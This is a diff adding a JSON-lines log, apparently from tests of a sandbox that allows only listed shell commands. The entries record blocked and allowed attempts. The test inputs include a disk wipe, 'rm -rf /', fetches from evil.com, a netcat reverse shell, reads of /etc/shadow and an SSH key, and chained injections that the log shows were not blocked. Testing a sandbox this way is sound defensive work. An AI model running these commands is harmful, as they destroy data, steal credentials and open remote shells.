@@ -1,0 +1,27 @@
+{"ts":"2026-06-04T01:01:17.667Z","command":"rm -rf /","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"rm\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.673Z","command":"chmod 777 /tmp/file","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"chmod\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.674Z","command":"wget http://evil.com","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"wget\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.675Z","command":"nc -e /bin/sh evil.com 4444","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"nc\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.676Z","command":"dd if=/dev/zero of=/dev/sda","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"dd\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.677Z","command":"","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Command \"(empty)\" is not in the allowlist."}
+{"ts":"2026-06-04T01:01:17.735Z","command":"find /tmp -maxdepth 1 -name '*.log'","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":57}
+{"ts":"2026-06-04T01:01:17.737Z","command":"ls /etc/passwd","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Argument \"/etc/passwd\" references a sensitive path. Access to credentials, SSH keys, and system auth files is blocked."}
+{"ts":"2026-06-04T01:01:17.738Z","command":"cat /etc/shadow","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Argument \"/etc/shadow\" references a sensitive path. Access to credentials, SSH keys, and system auth files is blocked."}
+{"ts":"2026-06-04T01:01:17.739Z","command":"cat /home/user/.ssh/id_rsa","cwd":null,"timeout":30000,"success":false,"blocked":true,"blockReason":"Argument \"/home/user/.ssh/id_rsa\" references a sensitive path. Access to credentials, SSH keys, and system auth files is blocked."}
+{"ts":"2026-06-04T01:01:17.824Z","command":"ls /tmp","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":84}
+{"ts":"2026-06-04T01:01:17.861Z","command":"echo safe; rm -rf /","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":35}
+{"ts":"2026-06-04T01:01:17.918Z","command":"echo payload | bash","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":56}
+{"ts":"2026-06-04T01:01:17.962Z","command":"echo $(whoami)","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":42}
+{"ts":"2026-06-04T01:01:17.993Z","command":"echo safe && rm -rf /","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":30}
+{"ts":"2026-06-04T01:01:17.995Z","command":"ls","cwd":"/etc","timeout":30000,"success":false,"blocked":true,"blockReason":"Working directory \"/etc\" is not under an allowed path."}
+{"ts":"2026-06-04T01:01:17.996Z","command":"ls","cwd":"/root","timeout":30000,"success":false,"blocked":true,"blockReason":"Working directory \"/root\" is not under an allowed path."}
+{"ts":"2026-06-04T01:01:18.038Z","command":"pwd","cwd":"/tmp","timeout":30000,"success":true,"blocked":false,"durationMs":36}
+{"ts":"2026-06-04T01:01:18.041Z","command":"ls","cwd":"/etc","timeout":30000,"success":false,"blocked":true,"blockReason":"Working directory \"/etc\" is not under an allowed path."}
+{"ts":"2026-06-04T01:01:18.085Z","command":"echo hello-world","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":36}
+{"ts":"2026-06-04T01:01:18.756Z","command":"node -e \"process.stderr.write('err'); process.stdout.write('out')\"","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":670}
+{"ts":"2026-06-04T01:01:18.794Z","command":"true","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":32}
+{"ts":"2026-06-04T01:01:19.311Z","command":"MY_TEST_VAR=hello node -e \"process.stdout.write(process.env.MY_TEST_VAR)\"","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":516}
+{"ts":"2026-06-04T01:01:19.341Z","command":"ls /nonexistent-dir-12345","cwd":null,"timeout":30000,"success":false,"blocked":false,"durationMs":29,"error":"Command failed: ls /nonexistent-dir-12345\nls: kan geen toegang krijgen tot '/nonexistent-dir-12345': Bestand of map bestaat niet\n"}
+{"ts":"2026-06-04T01:01:19.369Z","command":"test -f /nonexistent-file-xyz","cwd":null,"timeout":30000,"success":false,"blocked":false,"durationMs":27,"error":"Command failed: test -f /nonexistent-file-xyz\n"}
+{"ts":"2026-06-04T01:01:19.917Z","command":"sleep 60","cwd":null,"timeout":500,"success":false,"blocked":false,"durationMs":547,"error":"Command failed: sleep 60\n"}
+{"ts":"2026-06-04T01:01:20.530Z","command":"node -e \"process.stdout.write(Buffer.alloc(204800, 65).toString())\"","cwd":null,"timeout":30000,"success":true,"blocked":false,"durationMs":609}
